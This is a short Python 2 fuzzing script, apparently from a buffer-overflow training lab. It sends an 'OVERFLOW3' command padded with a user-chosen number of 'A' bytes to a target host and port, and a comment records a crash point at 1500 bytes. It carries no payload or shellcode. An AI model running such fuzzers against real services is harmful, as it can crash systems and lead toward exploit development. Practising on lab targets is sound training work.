#!/usr/bin/python2

import socket,sys

address = sys.argv[1]
port = int(sys.argv[2])

value=input("Enter the value of buffer : ")

buffer = 'A' * value
#breakpoint is 1500
try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send('OVERFLOW3 ' + buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.\n'
 	print 'Input Variable has been filled with the buffer ',buffer
 	sys.exit(0)
finally:
	s.close() 
